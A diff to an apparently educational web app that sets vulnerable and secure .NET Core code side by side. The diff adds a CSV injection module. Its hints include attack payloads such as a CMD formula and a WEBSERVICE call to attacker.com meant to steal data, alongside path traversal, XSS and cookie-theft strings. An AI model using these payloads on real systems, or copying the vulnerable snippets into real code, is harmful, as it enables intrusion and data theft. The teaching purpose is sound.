@@ -108,21 +108,22 @@
 
             <!-- HOME -->
             <div id="view-home" class="max-w-4xl mx-auto py-20 fade-in text-center">
-                
+
                 <h1 class="text-6xl font-black text-slate-900 mb-6">Application Security <span
                         class="text-indigo-600">Simulation</span></h1>
                 <p class="text-xl text-slate-600 mb-10">Interactive playground for .NET Core secure coding patterns and
                     vulnerability research.</p>
                 <div class="flex justify-center gap-4">
+                    
                     <button onclick="app.showDashboard()"
                         class="px-8 py-4 bg-slate-900 text-white rounded-2xl font-bold shadow-xl hover:bg-indigo-600 transition-colors">Launch
                         Dashboard</button>
                 </div>
                 <div class="mt-12 text-center">
-    <p class="text-s text-slate-500">
-        Developed by <span class="font-semibold text-indigo-600">BRPL Cyber Security Team</span>
-    </p>
-</div>
+                    <p class="text-s text-slate-500">
+                        Developed by <span class="font-semibold text-indigo-600">BRPL Cyber Security Team</span>
+                    </p>
+                </div>
             </div>
 
             <!-- DASHBOARD -->
@@ -271,9 +272,9 @@
                     </div>
                 </div>
             </div>
-            
+
         </div>
-    
+
 
     </main>
 
@@ -304,7 +305,7 @@
                     icon: "fa-hourglass-half",
                     severity: "High",
                     riskColor: "indigo",
-                    owasp: "OWASP:2025 – Mishandling of Exceptional Conditions",
+                    owasp: "OWASP : 2025 – Mishandling of Exceptional Conditions",
                     cwe: ["Common Weakness Enumeration - CWE-770-799"],
                     description: "Definition : Lack of resource limiting allowing for Brute Force, DoS, or credential stuffing attacks.",
                     vulnerableCode: 'public async Task<IActionResult> Login(LoginModel model)\n{\n    var result = await _signInManager.PasswordSignInAsync(model.Email, model.Password, false, false);\n    return Ok(result);\n}',
@@ -319,7 +320,7 @@
                     icon: "fa-user-ninja",
                     severity: "Critical",
                     riskColor: "rose",
-                    owasp: "OWASP:2025 – Authentication Failures",
+                    owasp: "OWASP : 2025 – Authentication Failures",
                     cwe: ["Common Weakness Enumeration - CWE-287-306"],
                     description: "Definition : Bypassing login via hidden 'Debug' flags or custom headers.",
                     vulnerableCode: 'if (Request.Headers["X-Admin-Bypass"] == "true")\n{\n    return await SignInUser("admin_user");\n}',
@@ -334,14 +335,14 @@
                     icon: "fa-folder-open",
                     severity: "High",
                     riskColor: "rose",
-                    owasp: "OWASP:2025 – Broken Access Control",
+                    owasp: "OWASP : 2025 – Broken Access Control",
                     cwe: ["Common Weakness Enumeration - CWE-22"],
                     description: "Definition : Accessing files outside the intended directory using '../' sequences.",
                     vulnerableCode: 'var filePath = Path.Combine(_rootPath, filename);\nreturn PhysicalFile(filePath, "application/octet-stream");',
                     vulnerableNote: "An attacker can read /etc/passwd by jumping directories.",
                     secureCode: 'var fileNameOnly = Path.GetFileName(filename);\nvar filePath = Path.Combine(_rootPath, "safe_dir", fileNameOnly);',
                     secureNote: "Always strip path information and validate the final destination path.",
-                    simulation: { type: "text", hint: "Try: ../../etc/passwd or ../appsettings.json" }
+                    simulation: { type: "text", hint: "PAYLOAD : ../../etc/passwd or ../appsettings.json" }
                 },
                 {
                     id: "session_hijacking",
@@ -349,14 +350,14 @@
                     icon: "fa-user-secret",
                     severity: "High",
                     riskColor: "rose",
-                    owasp: "OWASP:2025 – Authentication Failures",
+                    owasp: "OWASP : 2025 – Authentication Failures",
                     cwe: ["Common Weakness Enumeration - CWE-614-1004"],
                     description: "Definition : Stealing active session tokens due to lack of Secure/HttpOnly flags.",
                     vulnerableCode: 'options.HttpOnly = false;\noptions.Secure = false;\nResponse.Cookies.Append("SessionId", "12345", options);',
                     vulnerableNote: "Lack of HttpOnly allows XSS to steal cookies.",
                     secureCode: 'options.HttpOnly = true; \noptions.Secure = true;   \noptions.SameSite = SameSiteMode.Strict;',
                     secureNote: "Always use HttpOnly to prevent JS access and Secure to enforce HTTPS.",
-                    simulation: { type: "text", hint: "Try JS snippet: document.cookie" }
+                    simulation: { type: "text", hint: "PAYLOAD : document.cookie" }
                 },
                 {
                     id: "outdated_components",
@@ -364,14 +365,14 @@
                     icon: "fa-triangle-exclamation",
                     severity: "High",
                     riskColor: "amber",
-                    owasp: "OWASP:2025 – Software Supply Chain Failures",
+                    owasp: "OWASP : 2025 – Software Supply Chain Failures",
                     cwe: ["Common Weakness Enumeration - CWE-1104"],
                     description: "Definition : Using libraries with known CVEs (e.g., old Newtonsoft.Json versions).",
                     vulnerableCode: '<PackageReference Include="Newtonsoft.Json" Version="9.0.1" />',
                     vulnerableNote: "Old package versions contain public exploits like RCE.",
                     secureCode: '<PackageReference Include="Newtonsoft.Json" Version="13.0.1" />',
                     secureNote: "Regularly run vulnerability scanners like 'dotnet list package --vulnerable'.",
-                    simulation: { type: "text", hint: "Try: Newtonsoft.Json 9.0.1" }
+                    simulation: { type: "text", hint: "PAYLOAD : Newtonsoft.Json 9.0.1" }
                 },
                 {
                     id: "bac",
@@ -379,7 +380,7 @@
                     icon: "fa-id-card-clip",
                     severity: "High",
                     riskColor: "rose",
-                    owasp: "OWASP:2025 – Broken Access Control",
+                    owasp: "OWASP : 2025 – Broken Access Control",
                     cwe: ["CWE-285", "CWE-639"],
                     description: "Definition : Authenticated users accessing data they don't own (IDOR).",
                     vulnerableCode: 'return await _context.Accounts.FindAsync(id);',
@@ -394,7 +395,7 @@
                     icon: "fa-database",
                     severity: "Critical",
                     riskColor: "rose",
-                    owasp: "OWASP:2025 – Injection",
+                    owasp: "OWASP : 2025 – Injection",
                     cwe: ["CWE-89"],
                     description: "Definition : Manipulate database queries through untrusted input parameters.",
                     vulnerableCode: 'string sql = "SELECT * FROM Users WHERE ID = " + id;',
@@ -429,7 +430,7 @@
                     title: "Cross-Site Scripting (XSS)",
                     icon: "fa-code",
                     riskColor: "rose",
-                    owasp: "OWASP:2025 – Injection",
+                    owasp: "OWASP : 2025 – Injection",
                     description: "Definition : User input is rendered back to the browser without proper output encoding.",
                     vulnerableNote:
                         "User input is directly embedded into the HTML response without output encoding. \
@@ -456,9 +457,40 @@ and never executed as code. This effectively prevents Cross-Site Scripting attac
                         type: "input",
                         label: "Name parameter:",
                         placeholder: "Alex",
-                        hint: "Try XSS payloads like <script>alert('XSS')</scri pt>"
+                        hint: "PAYLOAD : <script>alert('XSS')</scri pt>"
                     }
                 },
+                {
+                    id: "csv_injection",
+                    title: "CSV Injection",
+                    icon: "fa-file-csv",
+                    severity: "Medium",
+                    riskColor: "amber",
+                    owasp: "OWASP : 2025 - Injection",
+                    cwe: ["CWE-1236 – Improper Neutralization in CSV"],
+                    description: "CSV Injection occurs when user input is exported into CSV files and executed as formulas by spreadsheet software.",
+                    vulnerableCode: `var csv = $"Name,Email\\n{user.Name},{user.Email}";
+return File(csv, "text/csv");`,
+                    vulnerableNote: "If user input starts with '=', '+', '-', or '@', spreadsheet software may execute it as a formula.",
+                    secureCode: `string Sanitize(string input)
+{
+    if (input.StartsWith("=") || input.StartsWith("+") ||
+        input.StartsWith("-") || input.StartsWith("@"))
+        return "'" + input;
+    return input;
+}`,
+                    secureNote: "Prefixing dangerous characters prevents formula execution while preserving data.",
+                    simulation: {
+                        label: "CSV Field Value:",
+                        placeholder: "=CMD|' /C calc'!A0",
+                        hint: `PAYLOADS:
+=CMD|' /C calc'!A0
+=HYPERLINK("https://attacker.com","Click Me")
+=WEBSERVICE("https://attacker.com/steal")`
+                    }
+
+                },
+
 
                 {
                     id: "ssti",
@@ -466,7 +498,7 @@ and never executed as code. This effectively prevents Cross-Site Scripting attac
                     icon: "fa-code",
                     severity: "High",
                     riskColor: "rose",
-                    owasp: "OWASP:2025 – Injection",
+                    owasp: "OWASP : 2025 – Injection",
                     cwe: ["Common Weakness Enumeration - CWE-94"],
                     description: "Definition : Server-Side Template Injection via dynamic code execution.",
                     vulnerableCode: 'string template = $"<h1>Welcome {userName}</h1>";\nreturn await _engine.CompileRenderStringAsync("key", template, model);',
@@ -481,7 +513,7 @@ and never executed as code. This effectively prevents Cross-Site Scripting attac
                     icon: "fa-file-upload",
                     severity: "High",
                     riskColor: "amber",
-                    owasp: "OWASP:2025 – Security Misconfiguration",
+                    owasp: "OWASP : 2025 – Security Misconfiguration",
                     cwe: ["Common Weakness Enumeration - CWE-434"],
                     description: "Definition : Execution of arbitrary code through malicious file uploads.",
                     vulnerableCode: 'file.SaveAs("/uploads/" + file.FileName);',
@@ -496,7 +528,7 @@ and never executed as code. This effectively prevents Cross-Site Scripting attac
                     icon: "fa-key",
                     severity: "High",
                     riskColor: "amber",
-                    owasp: "OWASP:2021 – Cryptographic Failures",
+                    owasp: "OWASP : 2021 – Cryptographic Failures",
                     cwe: ["CWE-321: Hard-coded Cryptographic Key", "CWE-347: Improper Verification of JWT"],
                     description: "Definition : Weak JWT secrets allow attackers to forge tokens and escalate privileges.",
                     vulnerableCode: `
@@ -544,7 +576,7 @@ var token = new JwtSecurityToken(
                     icon: "fa-folder-open",
                     riskColor: "rose",
                     severity: "High",
-                    owasp: "OWASP:2025 – Broken Access Control",
+                    owasp: "OWASP : 2025 – Broken Access Control",
                     cwe: ["CWE-22 – Path Traversal"],
 
                     description:
@@ -1071,6 +1103,49 @@ Security Controls:
                             `<span class="w-2 h-2 bg-emerald-500 mr-2 rounded-full"></span> XSS BLOCKED`;
                     }
                 }
+                else if (mod.id === 'csv_injection') {
+
+                    const dangerous = /^[=+\-@]/.test(input);
+
+                    if (this.state.mode === 'vulnerable' && dangerous) {
+                        resBody =
+                            `⚠ CSV FORMULA EXECUTED
+
+Cell Value Interpreted as Formula:
+${input}
+
+Impact:
+• Formula executed when opened in Excel
+• External request / command execution possible`;
+
+                        status.innerHTML =
+                            `<span class="w-2 h-2 bg-rose-500 mr-2 rounded-full"></span> CSV INJECTION EXPLOITED`;
+
+                    } else if (this.state.mode === 'secure' && dangerous) {
+                        resBody =
+                            `🛡 CSV SANITIZED
+
+Stored Value:
+'${input}
+
+Mitigation:
+Dangerous characters neutralized`;
+
+                        status.innerHTML =
+                            `<span class="w-2 h-2 bg-emerald-500 mr-2 rounded-full"></span> FORMULA BLOCKED`;
+
+                    } else {
+                        resBody =
+                            `CSV Export Successful
+
+Value Stored:
+${input}`;
+
+                        status.innerHTML =
+                            `<span class="w-2 h-2 bg-emerald-500 mr-2 rounded-full"></span> SAFE INPUT`;
+                    }
+                }
+
 
 
                 else if (mod.id === 'path_traversal') {
